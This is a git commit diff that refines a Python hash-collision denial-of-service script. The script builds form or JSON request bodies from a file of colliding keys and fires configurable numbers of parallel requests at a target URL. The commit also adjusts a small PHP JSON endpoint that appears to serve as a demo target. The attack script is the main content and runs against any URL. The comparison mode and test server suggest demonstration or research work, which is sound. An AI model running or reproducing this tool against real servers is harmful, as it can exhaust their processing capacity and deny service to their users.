b9ab505c065e97ed9a7d8dd5c0531d9a0909139a
Lukas Martinelli <me@lukasmartinelli.ch>
2014-07-28 16:30:20 +0200

    Made better command line interface

--- attack.py
+++ attack.py
@@ -1,18 +1,43 @@
 #!/usr/bin/env python
-import grequests
+"""Start a hash complexity attack
+Usage:
+    attack.py <url> <collisions> [--count <parallel_requests>] [--type <attack_type>] [--no-collide] [--shuffle]
+    attack.py (-h | --help)
+
+Options:
+    -h --help                      Show this screen
+    --count=<parallel_requests>    Amount of requests to make [default: 1]
+    --type=<attack_type>           Use json or form attack [default: form]
+    --no-collide                   Swap collision keys and values for comparison
+    --shuffle                      Randomize order of keys
+"""
+
 import time
 import sys
 import json
+import random
+from collections import OrderedDict
 
+import grequests
+from docopt import docopt
 
-def prepare_payload(collision_file):
+def prepare_payload(collision_file, collide=True):
     # Payload has to contain the correct names
     # otherwise the request will fail because of an index out of bounds errors
     payload = {"name": "", "email": ""}
-    with open("hashes.txt") as fh:
+    with open(collision_file) as fh:
         for i, line in enumerate(fh):
-            payload[line.strip()] = i
+            if collide:
+                payload[line.strip()] = i
+            else:
+                payload[i] = line.strip()
     return payload
+
+
+def shuffle_payload(payload):
+    items = payload.items()
+    random.shuffle(items)
+    return OrderedDict(items)
 
 
 def attack_with_form_fields(url, payload):
@@ -24,26 +49,38 @@ def attack_with_json_api(url, payload):
 
 
 if __name__ == "__main__":
-    url = sys.argv[1]
-    collision_file = sys.argv[2]
-    count = int(sys.argv[3])
-    method = sys.argv[4]
+    arguments = docopt(__doc__)
+    url = arguments["<url>"]
+    collision_file = arguments["<collisions>"]
+    count = int(arguments['--count'])
+    attack_type = arguments['--type']
 
-    payoad = prepare_payload(collision_file)
+    payload = prepare_payload(collision_file,
+                              collide=not arguments["--no-collide"])
     reqs = []
 
-    for i in range(0, count):
-        if method == "form":
-            req = attack_with_form_fields(url, payoad)
-        if method == "json":
-            req = attack_with_json_api(url, payoad)
+    def collide_text():
+        if arguments["--no-collide"]:
+            return "good"
+        else:
+            return "bad"
 
+    print("Creating {0} payload".format(collide_text()))
+    for i in range(0, count):
+        if arguments["--shuffle"] and i % 10 == 0:
+            payload = shuffle_payload(payload)
+        if attack_type == "form":
+            req = attack_with_form_fields(url, payload)
+        if attack_type == "json":
+            req = attack_with_json_api(url, payload)
         reqs.append(req)
 
     successful_responses = 0
     failed_responses = 0
 
+    print("Sent {0} {1} requests to {2} ".format(count, attack_type, url))
     start = time.time()
+    print("Waiting for response of all requests...")
     for resp in grequests.imap(reqs, stream=False, size=100):
         if resp.status_code == 200:
             successful_responses += 1
@@ -52,6 +89,6 @@ if __name__ == "__main__":
         resp.close()
     end = time.time()
     request_time = end - start
-    print("Made {0} requests in {1}seconds".format(count, request_time))
+    print("Total time: {0} seconds".format(request_time))
     print("Successful: {0}".format(successful_responses))
     print("Failed: {0}".format((failed_responses)))
--- server/api.php
+++ server/api.php
@@ -1,8 +1,8 @@
 <?php
     header('Content-Type: application/json');
-    $body = http_get_request_body()
-    $params = json_decode($body)
 
-    $response = array('name' => $params['name'], 'email' => $params['email'])
-    echo json_encode($response)
+    $body = file_get_contents('php://input');
+    $params = json_decode($body);
+    $response = array('name' => $params->{'name'}, 'email' => $params->{'email'});
+    echo json_encode($response);
 ?>
